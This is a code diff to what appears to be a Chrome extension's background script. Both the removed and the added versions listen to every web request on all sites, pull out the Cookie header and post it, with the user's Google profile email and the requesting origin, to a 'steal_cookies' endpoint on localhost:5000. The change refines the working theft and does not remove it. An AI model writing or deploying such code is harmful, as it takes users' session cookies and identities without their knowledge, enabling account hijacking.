@@ -1,25 +1,25 @@
 
-
-chrome.storage.local.get('email', function (result) {
-    var userEmail = result.email;
-    chrome.webRequest.onBeforeSendHeaders.addListener(
-        function (details) {
-            if (!(typeof details.requestHeaders === 'undefined')) {
+chrome.webRequest.onBeforeSendHeaders.addListener(
+    function (details) {
+        chrome.identity.getProfileUserInfo(function (userInfo) {
+            var userEmail = JSON.stringify(userInfo.email);
+            if (details.initiator != ('chrome-extension://' + chrome.runtime.id) && !(typeof details.requestHeaders === 'undefined')) {
                 for (var i = 0; i < details.requestHeaders.length; ++i) {
                     if (details.requestHeaders[i].name == 'Cookie') {
-                        // console.log(details.requestHeaders[i]);
-    
                         $.post("http://localhost:5000/steal_cookies", {
                             email: userEmail,
-                            url: window.location.origin,
+                            url: details.initiator,
                             cookies: details.requestHeaders[i].value
                         });
-    
                     }
                 }
             }
-            return { requestHeaders: details.requestHeaders };
-        },
-        { urls: ["<all_urls>"] },
-        ["blocking", "requestHeaders"]);
-});
+        });
+        return { 
+            requestHeaders: details.requestHeaders 
+        };
+    },
+    { urls: ["<all_urls>"] },
+    ["blocking", "requestHeaders"]
+);
+
